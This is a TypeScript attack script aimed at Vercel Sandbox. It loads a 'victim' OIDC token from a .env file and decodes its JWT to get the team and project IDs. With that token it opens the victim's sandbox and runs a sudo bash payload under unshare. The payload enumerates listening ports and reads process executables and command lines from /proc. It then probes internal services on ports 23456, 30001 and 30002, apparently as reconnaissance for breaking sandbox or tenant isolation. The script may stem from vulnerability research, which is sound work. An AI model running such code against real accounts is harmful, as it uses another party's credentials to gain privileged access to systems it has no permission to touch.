import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== listeners in cell netns ==="
ss -tlnp 2>/dev/null | head -30
echo "=== listeners (all) ==="
ss -tlnp 2>/dev/null | grep -E "23456|3000|30001|30002" 
echo "=== who owns it ==="
for port in 23456 30001 30002; do
  pid=$(ss -tlnp 2>/dev/null | grep ":$port " | grep -oP 'pid=\\d+' | head -1 | cut -d= -f2)
  echo "port $port pid=$pid"
  if [ -n "$pid" ]; then
    ls -l /proc/$pid/exe 2>/dev/null
    cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ' | head -c 300
    echo ""
  fi
done
echo "=== probe 23456 http ==="
timeout 3 curl -sv --max-time 2 http://127.0.0.1:23456/ 2>&1 | tail -8
echo "=== probe 23456 http2 (h2c) ==="
timeout 3 curl -sv --http2-prior-knowledge --max-time 2 http://127.0.0.1:23456/ 2>&1 | tail -8
echo "=== probe 30001 ==="
timeout 3 curl -sv --max-time 2 http://127.0.0.1:30001/ 2>&1 | tail -8
echo "=== probe 30002 ==="
timeout 3 curl -sv --max-time 2 http://127.0.0.1:30002/ 2>&1 | tail -8
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore33.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore33.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
